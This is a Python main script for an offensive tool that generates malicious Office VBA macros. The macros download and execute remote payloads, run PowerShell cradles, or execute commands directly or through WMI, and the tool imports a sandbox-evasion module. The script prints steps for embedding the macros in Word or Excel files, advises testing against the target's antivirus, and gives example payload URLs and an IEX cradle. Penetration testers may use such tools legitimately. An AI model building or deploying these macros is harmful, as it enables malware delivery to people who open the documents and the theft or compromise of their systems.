#!/usr/bin/env python3
import sys
import os
from generators.download_execute import DownloadExecuteMacro
from generators.powershell_cradle import PowerShellCradleMacro
from generators.direct_execution import DirectExecutionMacro
from generators.wmi_execution import WMIExecutionMacro
from evasion.sandbox_checks import SandboxEvasion

class MacroGenerator:
    """Main macro generator coordinating all types"""
    
    def __init__(self, payload_url=None, payload_command=None):
        self.payload_url = payload_url
        self.payload_command = payload_command
    
    def generate_url_based(self, output_dir='macros'):
        """Generate URL-based macros"""
        if not self.payload_url:
            print("[-] No payload URL provided")
            return
        
        os.makedirs(output_dir, exist_ok=True)
        
        print(f"[*] Generating URL-based macros...")
        print(f"[*] Payload URL: {self.payload_url}")
        print(f"[*] Output directory: {output_dir}\n")
        
        # Download and execute
        download_gen = DownloadExecuteMacro(self.payload_url)
        macro1 = download_gen.generate()
        file1 = os.path.join(output_dir, 'macro_download_execute.vba')
        with open(file1, 'w') as f:
            f.write(macro1)
        print(f"[+] Generated: {file1}")
        
        # PowerShell cradle
        ps_gen = PowerShellCradleMacro(self.payload_url)
        macro2 = ps_gen.generate()
        file2 = os.path.join(output_dir, 'macro_powershell_cradle.vba')
        with open(file2, 'w') as f:
            f.write(macro2)
        print(f"[+] Generated: {file2}")
    
    def generate_command_based(self, output_dir='macros'):
        """Generate command-based macros"""
        if not self.payload_command:
            print("[-] No command provided")
            return
        
        os.makedirs(output_dir, exist_ok=True)
        
        print(f"[*] Generating command-based macros...")
        print(f"[*] Command: {self.payload_command}")
        print(f"[*] Output directory: {output_dir}\n")
        
        # Direct execution
        direct_gen = DirectExecutionMacro(self.payload_command)
        macro1 = direct_gen.generate()
        file1 = os.path.join(output_dir, 'macro_direct_exec.vba')
        with open(file1, 'w') as f:
            f.write(macro1)
        print(f"[+] Generated: {file1}")
        
        # WMI execution
        wmi_gen = WMIExecutionMacro(self.payload_command)
        macro2 = wmi_gen.generate()
        file2 = os.path.join(output_dir, 'macro_wmi_exec.vba')
        with open(file2, 'w') as f:
            f.write(macro2)
        print(f"[+] Generated: {file2}")
    
    def print_usage_instructions(self):
        """Print instructions for using generated macros"""
        print("\n[*] To use these macros:")
        print("    1. Open Excel/Word")
        print("    2. Press Alt+F11 to open VBA editor")
        print("    3. Insert > Module")
        print("    4. Paste macro code")
        print("    5. Save as .xlsm (Excel) or .docm (Word)")
        print("\n[!] Test against target AV before deployment")
        print("[!] For authorized testing only")

def main():
    if len(sys.argv) < 2:
        print("=" * 60)
        print("Office Macro Generator")
        print("=" * 60)
        print("\nUsage:")
        print("  python3 main.py --url <payload_url> [output_dir]")
        print("  python3 main.py --cmd <command> [output_dir]")
        print("\nExamples:")
        print("  python3 main.py --url http://10.10.14.5/payload.ps1")
        print("  python3 main.py --cmd 'powershell -c IEX(...)' macros/")
        print("\n[!] For authorized security testing only")
        sys.exit(1)
    
    output_dir = sys.argv[3] if len(sys.argv) > 3 else 'macros'
    
    if sys.argv[1] == "--url" and len(sys.argv) >= 3:
        generator = MacroGenerator(payload_url=sys.argv[2])
        generator.generate_url_based(output_dir)
        generator.print_usage_instructions()
        
    elif sys.argv[1] == "--cmd" and len(sys.argv) >= 3:
        generator = MacroGenerator(payload_command=sys.argv[2])
        generator.generate_command_based(output_dir)
        generator.print_usage_instructions()
    
    else:
        print("[-] Invalid arguments")
        sys.exit(1)

if __name__ == "__main__":
    main()